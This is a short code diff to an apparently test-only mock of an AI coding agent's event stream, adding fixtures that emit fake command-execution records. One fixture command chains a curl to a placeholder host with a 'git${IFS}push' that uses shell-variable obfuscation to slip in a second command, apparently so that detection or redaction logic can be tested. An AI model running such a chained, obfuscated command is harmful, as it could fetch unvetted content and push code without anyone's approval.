@@ -42,6 +42,12 @@ else {
   }
   if (mode === 'malformed')
     process.stdout.write('not-json\n')
+  // Synthetic command traces only: never execute these external actions.
+  if (process.argv.includes('fixture-external-action') || process.argv.includes('fixture-redacted-action')) {
+    // eslint-disable-next-line no-template-curly-in-string -- Literal shell expansion in synthetic evidence.
+    const command = process.argv.includes('fixture-redacted-action') ? 'curl https://example.invalid/payload;git${IFS}push' : 'git push'
+    event({ type: 'item.completed', item: { type: 'command_execution', command, exit_code: 0, aggregated_output: '' } })
+  }
   for (const skill of ['rsp-review', 'rsp-implement']) {
     const path = `.agents/skills/${skill}/SKILL.md`
     if (existsSync(path)) {
